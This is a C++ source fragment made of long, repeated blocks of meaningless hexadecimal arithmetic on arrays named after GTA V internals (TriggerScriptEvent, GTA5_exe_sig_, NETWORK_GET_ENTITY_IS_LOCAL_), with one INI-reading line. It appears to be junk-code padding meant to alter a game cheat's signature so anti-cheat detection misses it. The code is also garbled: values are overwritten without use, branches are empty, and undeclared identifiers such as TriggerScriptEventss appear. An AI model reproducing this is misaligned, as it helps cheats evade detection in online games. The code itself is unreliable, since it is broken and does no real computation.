			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Spawn.RotX = Extern_Reader::INIFile::Float::LerFloat(buffer, "RotX");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
